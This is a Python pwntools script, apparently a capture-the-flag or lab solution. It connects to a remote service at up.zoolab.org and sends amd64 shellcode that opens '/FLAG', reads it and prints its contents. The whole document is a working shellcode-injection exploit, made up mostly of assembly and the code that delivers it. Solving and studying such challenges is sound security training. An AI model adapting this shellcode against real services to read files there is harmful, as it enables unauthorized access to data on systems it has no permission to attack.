#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import * # Imports asm, context, remote, log, etc.
import sys

# 1. Set the architecture context
context.arch = 'amd64'
context.os = 'linux' # Good practice, though asm mainly relies on arch

port = 12341
host = 'up.zoolab.org'

r = None
if 'local' in sys.argv[1:]:
    log.error("Local mode not configured for this script version.")
    sys.exit(1)
else:
    r = remote(host, port)

# 2. Write your assembly code as a Python multi-line string
assembly_code = """
jmp short string_data_marker

code_logic_marker:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, rax
    lea rsi, [rbp + 6]
    mov rdx, 64

read:
    mov rax, 0
    syscall

    mov rdx, rax
    mov rdi, 1

    mov rax, 1
    syscall

exit_sequence:
    xor rdi, rdi
    mov rax, 60
    syscall

string_data_marker:
    call code_logic_marker
    .asciz "/FLAG"
"""

# 3. Assemble the code using asm()
shellcode_bytes = asm(assembly_code)

# Wait for the server's prompt
prompt = r.recvuntil(b"Enter your code> ")
log.info(f"Received prompt: {prompt.decode(errors='ignore').strip()}")

# Send the assembled shellcode bytes
r.send(shellcode_bytes)

try:
    flag_output = r.recvall(timeout=2.0)
    log.success(f"Received output:\n{flag_output.decode(errors='ignore').strip()}")
except EOFError:
    log.info("EOF received. This is expected if shellcode exited correctly.")
except Exception as e:
    log.warning(f"An error occurred during recvall: {e}")
finally:
    if r and not r.closed:
        r.close()